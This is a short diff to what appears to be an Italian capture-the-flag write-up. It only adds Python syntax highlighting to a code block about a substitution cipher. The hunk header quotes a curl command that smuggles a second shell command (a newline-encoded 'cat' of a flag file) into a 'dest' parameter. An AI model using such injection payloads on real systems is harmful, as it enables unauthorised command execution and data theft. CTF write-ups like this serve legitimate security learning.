@@ -241,7 +241,7 @@ curl -XPOST -d 'dest=0.0.0.0%0acat<./there/is/your/flag/or/maybe/not/what/do/you
 
 ### Cifrario a sostituzione 2 figo
 
-```
+```python
 with open("ciphertext.txt", "r") as ciphertext_file:
     ciphertext = ciphertext_file.read().lower()
 
